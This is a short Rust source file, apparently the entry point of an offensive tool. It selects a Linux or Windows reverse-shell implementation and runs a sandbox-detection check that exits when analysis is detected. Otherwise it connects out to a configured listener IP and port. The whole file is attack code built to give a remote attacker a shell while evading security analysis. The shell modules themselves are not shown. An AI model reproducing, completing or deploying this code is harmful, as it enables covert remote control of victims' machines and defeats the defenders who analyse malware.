// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod rco_reverse_shell_linux;
#[cfg(target_os = "linux")]
use rco_reverse_shell_linux::shell;

// Load Windows implementation if the target OS is Windows
#[cfg(windows)]
mod rco_reverse_shell_windows;
#[cfg(windows)]
use rco_reverse_shell_windows::shell;

fn main() {
    // Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return
    }

    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
}
